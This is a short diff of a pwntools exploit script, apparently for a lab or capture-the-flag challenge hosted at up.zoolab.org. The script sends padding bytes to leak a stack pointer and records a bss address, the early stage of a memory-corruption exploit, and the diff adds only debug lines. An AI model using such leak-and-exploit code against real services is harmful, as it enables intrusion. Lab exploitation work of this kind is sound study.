@@ -25,10 +25,13 @@ else:
     r = remote('up.zoolab.org', port)
 
 
+# pause()
+
 r.recvuntil(b'name? ')
 payloads = b'A' * 40
 r.send(payloads)
 z = r.recvline()
+print("rec: ", z)
 hex_rbp = hex(u64(z.split(payloads)[1][:-1].ljust(8, b'\x00')))
 print(hex_rbp)
 
@@ -39,7 +42,6 @@ r.send(payloads)
 z = r.recvline()
 hex_rbp = hex(u64(z.split(payloads)[1][:-1].ljust(8, b'\x00')))
 print(hex_rbp)
-
 
 # 00000000000d31e0 <msg> in bss
 msg = 0xd31e0
